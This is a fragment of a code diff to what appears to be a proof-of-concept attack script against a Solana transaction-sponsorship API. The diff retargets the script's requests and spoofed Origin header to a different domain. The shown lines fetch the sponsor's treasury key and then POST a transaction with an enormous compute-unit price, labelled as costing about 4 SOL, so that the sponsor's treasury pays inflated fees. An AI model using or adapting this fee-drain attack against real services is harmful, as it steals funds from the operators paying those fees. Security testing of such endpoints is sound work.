@@ -5,7 +5,7 @@ const SHADOWSPACE = new PublicKey("EEnouVLAoQGMEbrypEhP3Ct5RgCViCWG4n1nCZNwMxjQ"
 
 async function main() {
   // 1. Get treasury pubkey from sponsor-tx
-  const res = await fetch("https://www.shyft.lol/api/sponsor-tx");
+  const res = await fetch("https://baddie.stream/api/sponsor-tx");
   const { treasuryPubkey } = await res.json();
   console.log("Treasury (fee payer):", treasuryPubkey);
 
@@ -45,11 +45,11 @@ async function main() {
   console.log("   ComputeUnitPrice: 730,000,000,000 microlamports");
   console.log("   This would cost ~4 SOL in fees\n");
 
-  const attackRes = await fetch("https://www.shyft.lol/api/sponsor-tx", {
+  const attackRes = await fetch("https://baddie.stream/api/sponsor-tx", {
     method: "POST",
     headers: { 
       "Content-Type": "application/json",
-      "Origin": "https://www.shyft.lol"
+      "Origin": "https://baddie.stream"
     },
     body: JSON.stringify({
       transaction: tx.serialize({ requireAllSignatures: false }).toString("base64"),
